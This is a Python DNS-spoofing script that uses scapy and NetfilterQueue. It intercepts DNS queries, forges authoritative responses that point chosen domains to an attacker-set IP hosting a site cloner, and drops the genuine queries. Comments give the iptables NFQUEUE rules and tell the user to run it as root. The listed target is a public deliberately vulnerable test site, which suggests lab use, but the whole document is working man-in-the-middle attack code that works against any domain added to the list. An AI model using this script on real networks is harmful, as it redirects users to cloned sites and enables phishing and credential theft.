#!/usr/bin/env python3
import socket
from netfilterqueue import NetfilterQueue
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send

# === CONFIGURATION ===
# The IP where your cloner is running
FAKE_IP = "192.168.40.128"           # ← set this to your local host’s IP
# Domains you want to spoof (must match TARGET_SITES in cloner.py)
TARGET_DOMAINS = [
    "testphp.vulnweb.com",
    # add more here...
]

QUEUE_NUM = 1                     # NetfilterQueue number

# === PACKET PROCESSING ===
def process_packet(packet):
    scapy_pkt = IP(packet.get_payload())

    # Only handle DNS queries
    if scapy_pkt.haslayer(DNSQR):
        qname = scapy_pkt[DNSQR].qname.decode().rstrip('.')
        if qname in TARGET_DOMAINS:
            print(f"[+] Spoofing DNS response for {qname}")

            # Build a new DNS response packet
            spoofed = IP(
                src=scapy_pkt.dst,
                dst=scapy_pkt.src
            ) / UDP(
                sport=53,
                dport=scapy_pkt[UDP].sport
            ) / DNS(
                id=scapy_pkt[DNS].id,     # keep same transaction ID
                qr=1,                      # this is a response
                aa=1,                      # authoritative
                qd=scapy_pkt[DNS].qd,      # original question
                an=DNSRR(
                    rrname=scapy_pkt[DNS].qd.qname,
                    ttl=300,
                    rdata=FAKE_IP
                )
            )

            send(spoofed, verbose=False)
            packet.drop()  # drop the original query
            return

    # all other packets just go through
    packet.accept()


def main():
    # Make sure you’ve run these iptables rules (adjust iface if needed):
    #    iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 1
    #    iptables -I OUTPUT  -p udp --dport 53 -j NFQUEUE --queue-num 1
    #    iptables -I INPUT   -p udp --sport 53 -j NFQUEUE --queue-num 1
    #
    # Then run this script as root:
    #    python3 dnsspoof.py

    nfq = NetfilterQueue()
    nfq.bind(QUEUE_NUM, process_packet)
    print(f"[*] Waiting for DNS queries (queue {QUEUE_NUM})...")
    try:
        nfq.run()
    except KeyboardInterrupt:
        print("\n[*] Flushing queue and exiting.")
        nfq.unbind()


if __name__ == "__main__":
    main()
